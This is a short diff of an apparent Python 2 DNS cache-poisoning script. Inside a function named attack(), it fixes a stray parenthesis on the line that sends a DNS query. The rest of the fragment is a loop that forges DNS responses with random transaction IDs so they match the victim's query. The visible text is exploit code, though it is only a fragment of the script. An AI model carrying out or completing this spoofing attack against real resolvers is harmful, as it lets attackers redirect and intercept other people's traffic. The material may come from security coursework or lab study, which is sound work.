@@ -78,7 +78,7 @@ def attack():
         fake_response[DNS].an.rrname = url
 
         # send dns query
-        sock.sendto(bytes(dns_request), (my_ip, dns_port)))
+        sock.sendto(bytes(dns_request), (my_ip, dns_port))
         for i in range(60):
             fake_response[DNS].id = getRandomTXID()
             print "TXID = %s" % str(fake_response[DNS].id)
